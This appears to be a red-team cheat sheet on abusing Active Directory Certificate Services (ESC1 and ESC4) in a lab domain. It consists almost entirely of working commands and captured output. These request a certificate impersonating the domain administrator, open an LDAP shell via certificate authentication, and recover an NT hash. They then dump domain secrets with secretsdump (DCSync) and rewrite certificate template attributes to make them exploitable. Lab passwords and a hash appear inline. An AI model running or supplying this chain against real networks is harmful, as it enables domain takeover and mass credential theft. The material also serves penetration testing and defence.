# ADCS

## ESC1

### Execute

```bash
# enumerate existing templates
certipy-ad find -scheme ldap -u TestAlpha@contoso.org -p 'win10-gui-P@$swd' -dc-ip 192.168.68.64 -stdout -vulnerable -enabled
# Certificate Authorities
#   0
#     CA Name                             : contoso-WIN-KML6TP4LOOL-CA-9
# ...
# 
# Certificate Templates
#   0
#     Template Name                       : Workstation
#     Display Name                        : Workstation Authentication
#     Certificate Authorities             : contoso-WIN-KML6TP4LOOL-CA-9
#     Enabled                             : True
#     Client Authentication               : True
#     Extended Key Usage                  : Client Authentication
#     Requires Manager Approval           : False
#     Validity Period                     : 1 year
#     Renewal Period                      : 6 weeks
#     Minimum RSA Key Length              : 2048
#     Permissions
#       Enrollment Permissions
#         Enrollment Rights               : CONTOSO.ORG\Domain Admins
#                                           CONTOSO.ORG\Authenticated Users
#     [!] Vulnerabilities
#       ESC1                              : 'CONTOSO.ORG\\Domain Computers' and 'CONTOSO.ORG\\Authenticated Users' can enroll, enrollee supplies subject and template allows client authentication
```

```bash
##############
### TEST-1 ### PKINIT not supported
##############
### WARNING ::: you cannot use shadow credentials certificates to logon to LDAP, only legitimately obtained one! it has to be signed with the CA.

certipy-ad req -u TestAlpha@contoso.org -p 'win10-gui-P@$swd' -target WIN-KML6TP4LOOL.contoso.org -ca contoso-WIN-KML6TP4LOOL-CA-9 -template Workstation -upn administrator@contoso.org -dc-ip 192.168.68.64 -debug
# [*] Successfully requested certificate
# [*] Got certificate with UPN 'administrator@contoso.org'
# [*] Saved certificate and private key to 'administrator.pfx'

# attempt to request a TGT using PKINIT
# if you get the following error that means DC's KDC certificate doesn't support PKINIT (because DC's certificate doesn't have "KDC Authentication" EKU)
certipy-ad auth -pfx ./administrator.pfx -dc-ip 192.168.68.64 -domain contoso.org
# [*] Using principal: administrator@contoso.org
# [*] Trying to get TGT...
# [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)

# got an error, so let's authenticate to LDAPS using mTLS then (passthecert.py)
# export public and private keys from a pfx file to a separate files
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
# [*] Writing private key to 'administrator.key'
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.cert
# [*] Writing certificate and  to 'administrator.cert'

# use certificates for mTLS LDAPS bind instead of PKINIT. This will rely on LDAP privileges the user has.
python3 ../utils/passthecert.py -action ldap-shell -crt administrator.cert -key administrator.key -domain contoso.org -dc-ip 192.168.68.64
# whoami
# # u:CONTOSO\Administrator


##############
### TEST-2 ### PKINIT supported
##############
# trying to get a TGT using a computer account (WIN-NUU0DPB1BVC) certificate
# the KDC (192.168.68.179) should have a certificate with "KDC Authentication" EKU issued
# after we got a TGT it tries to abuse U2U to itself (*see krb5.norg -> U2U abuse*) 
# in order to retrieve NT hash
certipy-ad auth -pfx ./WIN-NUU0DPB1BVC\$.pfx -dc-ip 192.168.68.179 -domain contoso.org -debug
# [*] Using principal: win-nuu0dpb1bvc$@contoso.org
# [*] Got TGT
# [*] Saved credential cache to 'win-nuu0dpb1bvc.ccache'
# [*] Got hash for 'win-nuu0dpb1bvc$@contoso.org': aad3b435b51404eeaad3b435b51404ee:d0773d3d8ae3a0f436b2b7e649faa137


# we can request an ST for that computer using hashes
export KRB5CCNAME='win-nuu0dpb1bvc.ccache'
impacket-getST -hashes aad3b435b51404eeaad3b435b51404ee:d0773d3d8ae3a0f436b2b7e649faa137 -spn CIFS/WIN-KML6TP4LOOL.contoso.org -dc-ip 192.168.68.64 contoso.org/WIN-NUU0DPB1BVC
# [*] Getting ST for user
# [*] Saving ticket in WIN-NUU0DPB1BVC@CIFS_WIN-KML6TP4LOOL.contoso.org@CONTOSO.ORG.ccache

# let's pass-the-hash to DCSync using impacket-secretsdump
export KRB5CCNAME='WIN-NUU0DPB1BVC@CIFS_WIN-KML6TP4LOOL.contoso.org@CONTOSO.ORG.ccache'
impacket-secretsdump -outputfile contoso.org.dump -k WIN-KML6TP4LOOL.contoso.org

# we can also perform secretsdump using just hashes (NOTE THE '$' SIGN AFTER COMPUTERNAME !!!!)
impacket-secretsdump -outputfile contoso.dump -hashes aad3b435b51404eeaad3b435b51404ee:d0773d3d8ae3a0f436b2b7e649faa137 'CONTOSO.ORG/WIN-NUU0DPB1BVC$@192.168.68.64'


##############
### !!UT!! ###
##############
# scan ADCS for vulnerable templates
Certify.exe find /vulnerable

# request a certificate specifying an "alternative name"
Certify.exe request /ca:ca.domain.local\ca /template:VulnTemplate /altname:TargetUser

# convert a certificate from .pem to .pfx
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# request a TGT for the user using Rubeus
Rubeus.exe asktgt /user:TargetUser /certificate:C:\Temp\cert.pfx

# remember: one session can only contain one TGT - you can use "runas /netonly"
```

### Prerequisites

1. EKU: Client Authentication
2. Template has to be enabled
3. Requires Manager Approval: FALSE
4. Enrollee Supplies Subject: True
5. You have to have `Enrollment Rights` to enroll to that template.

## ESC4

### Execute

```bash
### CERTIPY
# PAY ATTENTION TO "Write Owner Principals", "Write Dacl Principals", "Write Property Principals"
certipy-ad find -scheme ldap -u Administrator@contoso.org -p 'win2016-cli-P@$swd' -dc-ip 192.168.68.64 -stdout

### BLOODHOUND
rusthound -d contoso.org -u 'TestAlpha@contoso.org' -p 'win10-gui-P@$swd' -o /tmp/rusthound.txt -z
```

```bash
#################
### POWERVIEW ###
#################
# CHECK: Retrieve all certificate templates and their ACEs
Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
# if the commands retrieve ActiveDirectoryRights: WriteProperty to a template - you can edit it to your needs

# EDIT TEMPLATE: if you are able to edit the certificate template you can edit it so it will become vulnerable to ESC1
# in order to do it you need change the value of mspki-certificate-name-flag attribute to "1" and add "Client Authentication (1.3.6.1.5.5.7.3.2)" to pkiextendedkeyusage or/and mspki-certificate-application-policy
Set-DomainObject -Identity VulnCert -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -XOR @{'mspki-certificate-name-flag' = '1'}
Set-DomainObject -Identity VulnCert -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -LDAPFilter "(objectclass=pkicertificatetemplate)" -Set @{'mspki-certificate-application-policy' = '1.3.6.1.5.5.7.3.2', '1.3.6.1.5.5.7.3.4', '1.3.6.1.4.1.311.10.3.4'}
```

### Prerequisites

1. Template Security Permissions: Owner / WriteOwnerPrincipals / WriteDaclPrincipals / WritePropertyPrincipals.
2. Template has to be enabled
